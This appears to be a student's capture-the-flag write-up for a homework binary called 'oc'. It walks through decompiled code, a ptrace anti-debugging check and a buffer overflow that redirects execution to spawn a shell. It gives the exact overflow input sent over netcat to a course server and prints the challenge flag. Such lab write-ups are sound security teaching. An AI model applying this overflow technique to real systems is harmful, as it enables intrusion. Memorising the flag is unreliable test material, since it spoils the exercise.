---
layout: post
title: 'oc Writeup'
category: memo
slug: oc-writeup
---
Security Programming Homework 1-3

Using IDA Pro's impressive F5 decompilation, we discover sub\_80485D7() is the
most interesting part

```c
......
v6 = ptrace(0, 0, 1, 0);
......
if ( a1 != 14 )
{
    if ( a1 != 12 )
    {
        dword_804A044 = loc_8048707;
        src = loc_8048720;
        v4 = strlen(*(const char **)(a2 + 28));
        strncpy(dest, *(const char **)(a2 + 28), v4);
        if ( v6 >= 0 )
            memcpy(dword_804A044, src, src - dword_804A044);
    }
    puts("uhhh....it's something wrong.");
    exit(0);
}
system("/bin/sh");
return 0;
......
```

The program will copy the character(s) after 7th (including #7) character of a2
to dest. But dest is not used anymore (suspicious). Just keep in mind.

According to the text file (linux-anti-debugging.txt) from the hint

```c
int main()
{
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
        printf("DEBUGGING... Bye\n");
        return 1;
    }
    printf("Hello\n");
    return 0;
}
```

`ptrace()` will return positive integer while the exectuable is not being
debugged. So the program oc will show "The flag is Support for universal
suffrage in Hong Kong just kidding. :p" while not being debugged and show
"uhhh....it's something wrong." while being debugged.

Because dest can only contain 16 char, more than 16 char being copied to dest
will cause the variable, src, being overwritten

```nasm
0804A048    ; char dest[16]
0804A048    dest        db 10h dup(?)
0804A058    ; void *src
0804A058    src         dd ?
```

So our objective is to jump to 0x08048731, i.e. `system("/bin/sh")`. By
observation, we only need to overwritten 0x31. 0x31 is actually ASCII "1". In
conclusion, we need 7 candidates as input, and the 7th candidate must be length
of 17, the last character must be "1"

## Exploitation

1. `nc 140.113.208.235 10002`
1. input `1 1 1 1 1 1 11111111111111111`
1. got shell
1. `cat flag`

## Capture The Flag

The flag is `SECPROC{0ccupy_C3ntr4l_w1th_L0v3_4nd_P34c3}`
